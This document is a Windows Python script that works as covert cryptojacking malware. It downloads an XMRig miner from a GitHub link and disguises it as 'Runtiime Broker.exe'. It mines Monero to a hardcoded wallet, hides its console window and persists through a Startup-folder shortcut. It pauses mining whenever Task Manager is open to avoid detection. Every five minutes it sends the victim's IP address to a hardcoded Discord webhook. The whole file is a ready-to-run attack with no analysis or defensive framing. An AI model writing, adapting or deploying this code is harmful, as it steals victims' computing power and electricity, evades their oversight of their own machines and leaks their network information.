import os; os.system('pip install psutil requests pywin32 certifi')
import urllib.request
import zipfile
import subprocess
import platform
import certifi
import ctypes
import sys
import ssl
import json
import psutil
import time
import socket
from pathlib import Path
import requests
import win32com.client

MAX_CPU_USAGE = 20
WEBHOOK_URL = "https://discord.com/api/webhooks/1277802577236594689/iK4AGCZLfEuYcGx91hH7U6cYik_TjvWAccq3niqZGtKVrHQxCo-veaMtUDqQ3HAlwTIQ"  # Enter your Discord webhook URL here

def download_file(url, dest):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    with urllib.request.urlopen(url, context=ssl_context) as response:
        with open(dest, 'wb') as out_file:
            out_file.write(response.read())

def install_xmrig():
    user_appdata_roaming = Path(os.getenv('APPDATA'))
    xmrig_folder = user_appdata_roaming / "xmrig"
    zip_path = xmrig_folder / "test.zip"

    if not xmrig_folder.exists():
        xmrig_folder.mkdir(parents=True)
    
    if not zip_path.exists() or any(file.suffix == '.exe' and file.name == "Runtiime Broker.exe" for file in xmrig_folder.iterdir()):
        print("Downloading xmrig...")
        download_file("https://github.com/meestaa/xmrig/raw/main/test.zip", zip_path)

        print("Extracting xmrig...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            for file in zip_ref.namelist():
                if file.startswith('test/'):
                    file_path = file[len('test/'):]
                    extracted_file_path = xmrig_folder / file_path
                    if not extracted_file_path.exists():
                        zip_ref.extract(file, xmrig_folder)
                        os.rename(xmrig_folder / file, extracted_file_path)

        os.remove(zip_path)

    xmrig_path = xmrig_folder / "Runtiime Broker.exe"
    return xmrig_path, xmrig_folder

def calculate_threads(max_usage):
    total_cores = psutil.cpu_count(logical=True)
    threads_to_use = int((max_usage / 100) * total_cores)
    return max(1, threads_to_use)

def create_config(xmrig_folder):
    xmrig_path = xmrig_folder / "Runtiime Broker.exe"
    threads = calculate_threads(MAX_CPU_USAGE)
    config_json = {
        "autosave": True,
        "cpu": {"enabled": True, "threads": threads},
        "opencl": {"enabled": False},
        "cuda": {"enabled": False},
        "pools": [
            {
                "url": "pool.supportxmr.com:3333",
                "user": "46GrfqJXytRJKGN8VN8gJT6R9RrPFLDUcQCUTMgeHbPV6FTfxS5kmc99FMCPhiXuC19rkypATQjoMc1L5CJ84whqAmFA5ZT",
                "pass": "x",
                "keepalive": True,
                "nicehash": False
            },
            {
                "url": "p2pool.io:3333",
                "user": "46GrfqJXytRJKGN8VN8gJT6R9RrPFLDUcQCUTMgeHbPV6FTfxS5kmc99FMCPhiXuC19rkypATQjoMc1L5CJ84whqAmFA5ZT",
                "pass": "x",
                "keepalive": True,
                "nicehash": False
            }
        ],
        "donate-level": 0,
        "retries": 5,
        "retry-pause": 5,
    }
    config_path = xmrig_folder / "config.json"
    with open(config_path, 'w') as f:
        json.dump(config_json, f, indent=4)
    return config_path

def set_process_priority(process_name, priority):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            p = psutil.Process(proc.info['pid'])
            p.nice(priority)
            print(f"Priority of {process_name} set to {priority}.")
            return True
    return False

def create_startup_shortcut_for_script(script_path):
    startup_folder = Path(os.getenv('APPDATA')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    shortcut_path = startup_folder / "PythonScript.lnk"
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(str(shortcut_path))
    shortcut.Targetpath = str(sys.executable)  # Path to python.exe
    shortcut.Arguments = str(script_path)
    shortcut.WorkingDirectory = str(script_path.parent)
    shortcut.WindowStyle = 7  # Minimized
    shortcut.Save()

    print(f"Startup shortcut for script created at {shortcut_path}")

def get_ip_address():
    return socket.gethostbyname(socket.gethostname())

def send_webhook_message(message):
    try:
        response = requests.post(WEBHOOK_URL, json={"content": message})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send webhook message: {e}")

def start_mining(xmrig_path, config_path):
    print("Starting mining...")
    if not xmrig_path.exists():
        raise FileNotFoundError(f"The specified xmrig executable was not found: {xmrig_path}")

    process = subprocess.Popen([str(xmrig_path), "-c", str(config_path)], cwd=xmrig_path.parent)
    return process

def monitor_task_manager(xmrig_path, config_path, process):
    task_manager_name = "Taskmgr.exe"
    priority_set = False
    start_time = time.time()
    while True:
        if process.poll() is not None:
            break

        if not priority_set:
            priority_set = set_process_priority("Runtiime Broker.exe", psutil.BELOW_NORMAL_PRIORITY_CLASS)

        task_manager_open = any(proc.name() == task_manager_name for proc in psutil.process_iter(['name']))
        
        if task_manager_open:
            print("Task Manager is open. Stopping mining...")
            process.terminate()
            process.wait()
            while any(proc.name() == task_manager_name for proc in psutil.process_iter(['name'])):
                time.sleep(1)
            print("Task Manager closed. Restarting mining...")
            process = start_mining(xmrig_path, config_path)
            priority_set = False

        if time.time() - start_time >= 300:  # Send a message every 5 minutes (300 seconds)
            ip_address = get_ip_address()
            send_webhook_message(f"Mining process is still running. IP Address: {ip_address}")
            start_time = time.time()

        time.sleep(2)

def hide_console():
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden Console")
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE
        ctypes.windll.kernel32.SetConsoleTitleW("Console")

def main():
    hide_console()
    
    xmrig_path, xmrig_folder = install_xmrig()
    config_path = create_config(xmrig_folder)
    
    process = start_mining(xmrig_path, config_path)
    
    monitor_task_manager(xmrig_path, config_path, process)

if __name__ == "__main__":
    script_path = Path(__file__)
    create_startup_shortcut_for_script(script_path)
    main()
